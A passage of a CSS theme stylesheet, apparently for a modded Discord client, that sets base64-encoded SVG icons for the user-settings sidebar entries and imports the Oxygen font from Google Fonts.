	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9IiNGRkZGRkYiIHZpZXdCb3g9IjAgMCA4IDEyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJtNCAwLTQgNHY0bDQgNCA0LTR2LTRsLTQtNHptMyA3LjU5LTMgMy0zLTN2LTMuMThsMy0zIDMgM3YzLjE4eiIvPgo8cGF0aCBkPSJtMiA0LjgzdjIuMzRsMiAyIDItMnYtMi4zNGwtMi0yLTIgMnoiLz4KPC9zdmc+Cg==)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(24):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB2aWV3Qm94PSIwIDAgMzIgMzIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cjx0aXRsZT5oeXBlc3F1YWQtZXZlbnQtYXR0ZW5kZWU8L3RpdGxlPgo8cGF0aCBkPSJNMzEuNDMsOC43OSwxOC43NywxNy4xYTEuNDcsMS40NywwLDAsMC0uNTEuNTdsLTEuOTMsMy44N2EuMzYuMzYsMCwwLDEtLjY2LDBsLTEuOTMtMy44N2ExLjQ3LDEuNDcsMCwwLDAtLjUxLS41N0wuNTcsOC43OUEuMzcuMzcsMCwwLDAsMCw5LjI3TDUuMjksMTkuNTZBLjM4LjM4LDAsMCwxLDUsMjAuMUgxLjgyYS4zNy4zNywwLDAsMC0uMjIuNjdMMTUuNzgsMzAuOTNhLjM5LjM5LDAsMCwwLC40NCwwTDMwLjQsMjAuNzdhLjM3LjM3LDAsMCwwLS4yMi0uNjdIMjdhLjM4LjM4LDAsMCwxLS4zMy0uNTRMMzIsOS4yN0EuMzcuMzcsMCwwLDAsMzEuNDMsOC43OVoiIGZpbGw9IiNmYmI4NDgiLz4KPHBhdGggZD0iTTE2LjI4LDEuMTdsMS4zLDIuNjVhLjMzLjMzLDAsMCwwLC4yMy4xN2wyLjkzLjQyYS4zMS4zMSwwLDAsMSwuMTcuNTNMMTguNzksN2EuMzMuMzMsMCwwLDAtLjA5LjI3bC41LDIuOTFhLjMuMywwLDAsMS0uNDQuMzJMMTYuMTQsOS4xM2EuMjguMjgsMCwwLDAtLjI4LDBMMTMuMjQsMTAuNWEuMy4zLDAsMCwxLS40NC0uMzJsLjUtMi45MUEuMzMuMzMsMCwwLDAsMTMuMjEsN0wxMS4wOSw0Ljk0YS4zMS4zMSwwLDAsMSwuMTctLjUzTDE0LjE5LDRhLjMzLjMzLDAsMCwwLC4yMy0uMTdsMS4zLTIuNjVBLjMxLjMxLDAsMCwxLDE2LjI4LDEuMTdaIiBmaWxsPSIjZmJiODQ4Ii8+Cjwvc3ZnPgo=);
    background-size: cover;
}

/* App Settings */
[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(14):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0xMiAxNGMxLjY2IDAgMi45OS0xLjM0IDIuOTktM0wxNSA1YzAtMS42Ni0xLjM0LTMtMy0zUzkgMy4zNCA5IDV2NmMwIDEuNjYgMS4zNCAzIDMgM3ptNS4zLTNjMCAzLTIuNTQgNS4xLTUuMyA1LjFTNi43IDE0IDYuNyAxMUg1YzAgMy40MSAyLjcyIDYuMjMgNiA2LjcyVjIxaDJ2LTMuMjhjMy4yOC0uNDggNi0zLjMgNi02LjcyaC0xLjd6Ii8+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPC9zdmc+Cg==)
}

/* Missing 15 */
.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(999):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTkuNCAxMC41bDQuNzctOC4yNkMxMy40NyAyLjA5IDEyLjc1IDIgMTIgMmMtMi40IDAtNC42Ljg1LTYuMzIgMi4yNWwzLjY2IDYuMzUuMDYtLjF6TTIxLjU0IDljLS45Mi0yLjkyLTMuMTUtNS4yNi02LTYuMzRMMTEuODggOWg5LjY2em0uMjYgMWgtNy40OWwuMjkuNSA0Ljc2IDguMjVDMjEgMTYuOTcgMjIgMTQuNjEgMjIgMTJjMC0uNjktLjA3LTEuMzUtLjItMnpNOC41NCAxMmwtMy45LTYuNzVDMy4wMSA3LjAzIDIgOS4zOSAyIDEyYzAgLjY5LjA3IDEuMzUuMiAyaDcuNDlsLTEuMTUtMnptLTYuMDggM2MuOTIgMi45MiAzLjE1IDUuMjYgNiA2LjM0TDEyLjEyIDE1SDIuNDZ6bTExLjI3IDBsLTMuOSA2Ljc2Yy43LjE1IDEuNDIuMjQgMi4xNy4yNCAyLjQgMCA0LjYtLjg1IDYuMzItMi4yNWwtMy42Ni02LjM1LS45MyAxLjZ6Ii8+Cjwvc3ZnPgo=)
}


.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(17):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0xMiAyMmMxLjEgMCAyLS45IDItMmgtNGMwIDEuMS44OSAyIDIgMnptNi02di01YzAtMy4wNy0xLjY0LTUuNjQtNC41LTYuMzJWNGMwLS44My0uNjctMS41LTEuNS0xLjVzLTEuNS42Ny0xLjUgMS41di42OEM3LjYzIDUuMzYgNiA3LjkyIDYgMTF2NWwtMiAydjFoMTZ2LTFsLTItMnoiLz4KPC9zdmc+Cg==)
}

.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(15):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yMCA1SDRjLTEuMSAwLTEuOTkuOS0xLjk5IDJMMiAxN2MwIDEuMS45IDIgMiAyaDE2YzEuMSAwIDItLjkgMi0yVjdjMC0xLjEtLjktMi0yLTJ6bS05IDNoMnYyaC0yVjh6bTAgM2gydjJoLTJ2LTJ6TTggOGgydjJIOFY4em0wIDNoMnYySDh2LTJ6bS0xIDJINXYtMmgydjJ6bTAtM0g1VjhoMnYyem05IDdIOHYtMmg4djJ6bTAtNGgtMnYtMmgydjJ6bTAtM2gtMlY4aDJ2MnptMyAzaC0ydi0yaDJ2MnptMC0zaC0yVjhoMnYyeiIvPgo8L3N2Zz4K)
}

.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(16):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yMCAySDRjLTEuMSAwLTEuOTkuOS0xLjk5IDJMMiAyMmw0LTRoMTRjMS4xIDAgMi0uOSAyLTJWNGMwLTEuMS0uOS0yLTItMnpNNiA5aDEydjJINlY5em04IDVINnYtMmg4djJ6bTQtNkg2VjZoMTJ2MnoiLz4KPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPgo8L3N2Zz4K)
}

.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(20):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTE3IDEwLjVWN2MwLS41NS0uNDUtMS0xLTFINGMtLjU1IDAtMSAuNDUtMSAxdjEwYzAgLjU1LjQ1IDEgMSAxaDEyYy41NSAwIDEtLjQ1IDEtMXYtMy41bDQgNHYtMTFsLTQgNHoiLz4KPC9zdmc+Cg==)
}

.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(19):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTExLjk5IDJDNi40NyAyIDIgNi40OCAyIDEyczQuNDcgMTAgOS45OSAxMEMxNy41MiAyMiAyMiAxNy41MiAyMiAxMlMxNy41MiAyIDExLjk5IDJ6bTYuOTMgNmgtMi45NWMtLjMyLTEuMjUtLjc4LTIuNDUtMS4zOC0zLjU2IDEuODQuNjMgMy4zNyAxLjkxIDQuMzMgMy41NnpNMTIgNC4wNGMuODMgMS4yIDEuNDggMi41MyAxLjkxIDMuOTZoLTMuODJjLjQzLTEuNDMgMS4wOC0yLjc2IDEuOTEtMy45NnpNNC4yNiAxNEM0LjEgMTMuMzYgNCAxMi42OSA0IDEycy4xLTEuMzYuMjYtMmgzLjM4Yy0uMDguNjYtLjE0IDEuMzItLjE0IDIgMCAuNjguMDYgMS4zNC4xNCAySDQuMjZ6bS44MiAyaDIuOTVjLjMyIDEuMjUuNzggMi40NSAxLjM4IDMuNTYtMS44NC0uNjMtMy4zNy0xLjktNC4zMy0zLjU2em0yLjk1LThINS4wOGMuOTYtMS42NiAyLjQ5LTIuOTMgNC4zMy0zLjU2QzguODEgNS41NSA4LjM1IDYuNzUgOC4wMyA4ek0xMiAxOS45NmMtLjgzLTEuMi0xLjQ4LTIuNTMtMS45MS0zLjk2aDMuODJjLS40MyAxLjQzLTEuMDggMi43Ni0xLjkxIDMuOTZ6TTE0LjM0IDE0SDkuNjZjLS4wOS0uNjYtLjE2LTEuMzItLjE2LTIgMC0uNjguMDctMS4zNS4xNi0yaDQuNjhjLjA5LjY1LjE2IDEuMzIuMTYgMiAwIC42OC0uMDcgMS4zNC0uMTYgMnptLjI1IDUuNTZjLjYtMS4xMSAxLjA2LTIuMzEgMS4zOC0zLjU2aDIuOTVjLS45NiAxLjY1LTIuNDkgMi45My00LjMzIDMuNTZ6TTE2LjM2IDE0Yy4wOC0uNjYuMTQtMS4zMi4xNC0yIDAtLjY4LS4wNi0xLjM0LS4xNC0yaDMuMzhjLjE2LjY0LjI2IDEuMzEuMjYgMnMtLjEgMS4zNi0uMjYgMmgtMy4zOHoiLz4KPC9zdmc+Cg==)
}

.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(18):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSJ3aGl0ZSIgdmlld0JveD0iMCAwIDI0IDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTE4IDl2NEg2VjlINHY2aDE2VjloLTJ6Ii8+Cjwvc3ZnPgo=)
}

.platform-linux [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(22):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Im0xNC42MiA4LjM1Yy0wLjQyIDAuMjgtMS43NSAxLjA0LTEuOTUgMS4xOS0wLjM5IDAuMzEtMC43NSAwLjI5LTEuMTQtMC4wMS0wLjItMC4xNi0xLjUzLTAuOTItMS45NS0xLjE5LTAuNDgtMC4zMS0wLjQ1LTAuNyAwLjA4LTAuOTIgMS42NC0wLjY5IDMuMjgtMC42NCA0LjkxIDAuMDMgMC40OSAwLjIxIDAuNTEgMC42IDAuMDUgMC45bTcuMjIgNy4yOGMtMC45My0yLjA5LTIuMi0zLjk5LTMuODQtNS42Ni0wLjUzLTAuNTUtMC44Ni0xLjE3LTEuMDYtMS44OC0wLjEtMC4zMy0wLjE3LTAuNjctMC4yNC0xLjAxLTAuMi0wLjg4LTAuMjktMS43OC0wLjctMi42MS0wLjczLTEuNTgtMi0yLjQtMy44NC0yLjQ3LTEuODEgMC4wNS0zLjE2IDAuODEtMy45NSAyLjQtMC4yMSAwLjQzLTAuMzYgMC44OC0wLjQ2IDEuMzQtMC4xNyAwLjc2LTAuMzIgMS41NS0wLjUgMi4zMi0wLjE1IDAuNjUtMC40NSAxLjIxLTAuOTYgMS43MS0xLjYxIDEuNTctMi45IDMuMzctMy44OCA1LjM1LTAuMTQgMC4yOS0wLjI4IDAuNTgtMC4zNyAwLjg4LTAuMTkgMC42NiAwLjI5IDEuMTIgMC45OSAwLjk2IDAuNDQtMC4wOSAwLjg4LTAuMTggMS4zLTAuMzEgMC40MS0wLjE1IDAuNTctMC4wNSAwLjY3IDAuMzUgMC42NSAyLjE1IDIuMDcgMy42NiA0LjI0IDQuNSA0LjEyIDEuNTYgOC45My0wLjY2IDkuOTctNC41OCAwLjA3LTAuMjcgMC4xNy0wLjM3IDAuNDctMC4yNyAwLjQ2IDAuMTQgMC45MyAwLjI0IDEuNCAwLjM1IDAuNDkgMC4wOSAwLjg1LTAuMTYgMC45Mi0wLjY0IDAuMDMtMC4yNi0wLjA2LTAuNDktMC4xNi0wLjczIi8+Cjwvc3ZnPgo=)
}

.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(23):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTEzIDNjLTQuOTcgMC05IDQuMDMtOSA5SDFsMy44OSAzLjg5LjA3LjE0TDkgMTJINmMwLTMuODcgMy4xMy03IDctN3M3IDMuMTMgNyA3LTMuMTMgNy03IDdjLTEuOTMgMC0zLjY4LS43OS00Ljk0LTIuMDZsLTEuNDIgMS40MkM4LjI3IDE5Ljk5IDEwLjUxIDIxIDEzIDIxYzQuOTcgMCA5LTQuMDMgOS05cy00LjAzLTktOS05em0tMSA1djVsNC4yOCAyLjU0LjcyLTEuMjEtMy41LTIuMDhWOEgxMnoiLz4KPC9zdmc+Cg==)
}

/* PC */

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="pc-moduleManager-plugins"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Im0yMC41IDExaC0xLjV2LTRjMC0xLjExLTAuOS0yLTItMmgtNHYtMS41YTIuNSAyLjUgMCAwIDAtMi41LTIuNSAyLjUgMi41IDAgMCAwLTIuNSAyLjV2MS41aC00YTIgMiAwIDAgMC0yIDJ2My44aDEuNWMxLjUgMCAyLjcgMS4yIDIuNyAyLjdzLTEuMiAyLjctMi43IDIuN2gtMS41djMuOGEyIDIgMCAwIDAgMiAyaDMuOHYtMS41YzAtMS41IDEuMi0yLjcgMi43LTIuN3MyLjcgMS4yIDIuNyAyLjd2MS41aDMuOGEyIDIgMCAwIDAgMi0ydi00aDEuNWEyLjUgMi41IDAgMCAwIDIuNS0yLjUgMi41IDIuNSAwIDAgMC0yLjUtMi41eiIvPgo8L3N2Zz4K);
}

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="pc-moduleManager-themes"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0xMiAzYy00Ljk3IDAtOSA0LjAzLTkgOXM0LjAzIDkgOSA5Yy44MyAwIDEuNS0uNjcgMS41LTEuNSAwLS4zOS0uMTUtLjc0LS4zOS0xLjAxLS4yMy0uMjYtLjM4LS42MS0uMzgtLjk5IDAtLjgzLjY3LTEuNSAxLjUtMS41SDE2YzIuNzYgMCA1LTIuMjQgNS01IDAtNC40Mi00LjAzLTgtOS04em0tNS41IDljLS44MyAwLTEuNS0uNjctMS41LTEuNVM1LjY3IDkgNi41IDkgOCA5LjY3IDggMTAuNSA3LjMzIDEyIDYuNSAxMnptMy00QzguNjcgOCA4IDcuMzMgOCA2LjVTOC42NyA1IDkuNSA1czEuNS42NyAxLjUgMS41UzEwLjMzIDggOS41IDh6bTUgMGMtLjgzIDAtMS41LS42Ny0xLjUtMS41UzEzLjY3IDUgMTQuNSA1czEuNS42NyAxLjUgMS41UzE1LjMzIDggMTQuNSA4em0zIDRjLS44MyAwLTEuNS0uNjctMS41LTEuNVMxNi42NyA5IDE3LjUgOXMxLjUuNjcgMS41IDEuNS0uNjcgMS41LTEuNSAxLjV6Ii8+Cjwvc3ZnPgo=)!important;
}

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="pc-clickableEdits"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyAgUFVCTElDICctLy9XM0MvL0RURCBTVkcgMS4xLy9FTicgICdodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQnPgo8c3ZnIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCgk8cmVjdCB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9Im5vbmUiLz4KCgoJPGcgZmlsbD0iI2ZmZiI+CgkJPHBhdGggZD0ibTIwLjEwMyA5LjU4OSAwLjcxOS0wLjcxOWMxLjU3LTEuNTY4IDEuNTctNC4xMjQgMC01LjY5Mi0xLjU2OS0xLjU3LTQuMTI0LTEuNTctNS42OTIgMGwtMC43MTkgMC43MTkgNS42OTIgNS42OTJ6Ii8+CgkJPHBvbHlnb24gcG9pbnRzPSIxMi45OTcgNS4zMTEgNC4wOTIgMTQuMjE1IDcuNjY0IDE0LjkyMyAxNS4xMzYgNy40NDkiLz4KCQk8cGF0aCBkPSJtMi4yOTUgMjEuNzA2YzAuMjQ3IDAuMjQ4IDAuNjA4IDAuMzQ3IDAuOTQ5IDAuMjYzbDQuNjc4LTEuMTctMC43OC0zLjk0MS0zLjk0MS0wLjc4MS0xLjE2OSA0LjY3OGMtMC4wODUgMC4zNDIgMC4wMTQgMC43MDIgMC4yNjMgMC45NTF6Ii8+CgkJPHBvbHlnb24gcG9pbnRzPSIxNi41NSA4Ljg2MyA5LjA3OCAxNi4zMzcgOS43ODUgMTkuOTA3IDE4LjY4OSAxMS4wMDMiLz4KCTwvZz4KCjwvc3ZnPgo=);
}

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="pc-spotify"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyAgUFVCTElDICctLy9XM0MvL0RURCBTVkcgMS4xLy9FTicgICdodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQnPgo8c3ZnIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCgk8cmVjdCB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9Im5vbmUiLz4KCgoJPHBhdGggZD0ibTE5LjM5NiAzLjI5OWMtMC4zOC0wLjI4My0wLjg3Mi0wLjM2OC0xLjMyNi0wLjIzNGwtMTAgM2MtMC42MzUgMC4xOS0xLjA3IDAuNzc1LTEuMDcgMS40Mzh2Ny41NTFjLTAuMTY1LTAuMDI0LTAuMzI5LTAuMDUxLTAuNS0wLjA1MS0xLjkzNCAwLTMuNSAxLjU2OC0zLjUgMy41IDAgMS45MzEgMS41NjYgMy41IDMuNSAzLjVzMy41LTEuNTY5IDMuNS0zLjV2LTkuODg1bDctMi4xdjYuNTM2Yy0wLjE2NS0wLjAyNC0wLjMyOS0wLjA1MS0wLjUtMC4wNTEtMS45MzQgMC0zLjUgMS41NjgtMy41IDMuNSAwIDEuOTMxIDEuNTY2IDMuNSAzLjUgMy41czMuNS0xLjU2OSAzLjUtMy41di0xMmMwLTAuNDc2LTAuMjI1LTAuOTIxLTAuNjA0LTEuMjA0eiIgZmlsbD0iI2ZmZiIvPgoKPC9zdmc+Cg==);
}

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="pc-emojiUtility"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0xMiwyQzYuNDcsMiAyLDYuNSAyLDEyQTEwLDEwIDAgMCwwIDEyLDIyQTEwLDEwIDAgMCwwIDIyLDEyQTEwLDEwIDAgMCwwIDEyLDJNMTUuNSw4QTEuNSwxLjUgMCAwLDEgMTcsOS41QTEuNSwxLjUgMCAwLDEgMTUuNSwxMUExLjUsMS41IDAgMCwxIDE0LDkuNUExLjUsMS41IDAgMCwxIDE1LjUsOE04LjUsOEExLjUsMS41IDAgMCwxIDEwLDkuNUExLjUsMS41IDAgMCwxIDguNSwxMUExLjUsMS41IDAgMCwxIDcsOS41QTEuNSwxLjUgMCAwLDEgOC41LDhNMTIsMTcuNUM5LjY3LDE3LjUgNy42OSwxNi4wNCA2Ljg5LDE0SDE3LjExQzE2LjMsMTYuMDQgMTQuMzMsMTcuNSAxMiwxNy41WiIvPgo8L3N2Zz4K);
}

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="changelog"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTEzIDNjLTQuOTcgMC05IDQuMDMtOSA5SDFsMy44OSAzLjg5LjA3LjE0TDkgMTJINmMwLTMuODcgMy4xMy03IDctN3M3IDMuMTMgNyA3LTMuMTMgNy03IDdjLTEuOTMgMC0zLjY4LS43OS00Ljk0LTIuMDZsLTEuNDIgMS40MkM4LjI3IDE5Ljk5IDEwLjUxIDIxIDEzIDIxYzQuOTcgMCA5LTQuMDMgOS05cy00LjAzLTktOS05em0tMSA1djVsNC4yOCAyLjU0LjcyLTEuMjEtMy41LTIuMDhWOEgxMnoiLz4KPC9zdmc+Cg==);
}

.sidebar-CFHs9e .item-PXvHYJ[data-item-id="logout"]:before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyAgUFVCTElDICctLy9XM0MvL0RURCBTVkcgMS4xLy9FTicgICdodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQnPgo8c3ZnIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDI0IDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJtMTkgM2gtMTRjLTEuMTEgMC0yIDAuODktMiAydjRoMnYtNGgxNHYxNGgtMTR2LTRoLTJ2NGEyIDIgMCAwIDAgMiAyaDE0YTIgMiAwIDAgMCAyLTJ2LTE0YzAtMS4xMS0wLjktMi0yLTJtLTguOTIgMTIuNTggMS40MiAxLjQyIDUtNS01LTUtMS40MiAxLjQxIDIuNTkgMi41OWgtOS42N3YyaDkuNjdsLTIuNTkgMi41OHoiIGZpbGw9IiNmZmYiLz4KPC9zdmc+Cg==);
}

/* BD Log Out */
.platform-win [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(28):before,
.platform-osx [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(27):before,
.platform-linux [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(27):before,
.platform-web [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(26):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyAgUFVCTElDICctLy9XM0MvL0RURCBTVkcgMS4xLy9FTicgICdodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQnPgo8c3ZnIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDI0IDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJtMTkgM2gtMTRjLTEuMTEgMC0yIDAuODktMiAydjRoMnYtNGgxNHYxNGgtMTR2LTRoLTJ2NGEyIDIgMCAwIDAgMiAyaDE0YTIgMiAwIDAgMCAyLTJ2LTE0YzAtMS4xMS0wLjktMi0yLTJtLTguOTIgMTIuNTggMS40MiAxLjQyIDUtNS01LTUtMS40MiAxLjQxIDIuNTkgMi41OWgtOS42N3YyaDkuNjdsLTIuNTkgMi41OHoiIGZpbGw9IiNmZmYiLz4KPC9zdmc+Cg==)
}
.side-8zPYf6 .themed-OHr7kt.item-PXvHYJ:hover:not(.disabled-1Hwwfb), .topPill-30KHOu .themed-OHr7kt.item-PXvHYJ:hover:not(.disabled-1Hwwfb) {
    background-color: rgb(var(--vaccentcolor), 0.1);
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fonts ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Fonts | Adding Oxygen Font*/
@import url('https://fonts.googleapis.com/css2?family=Oxygen&display=swap');

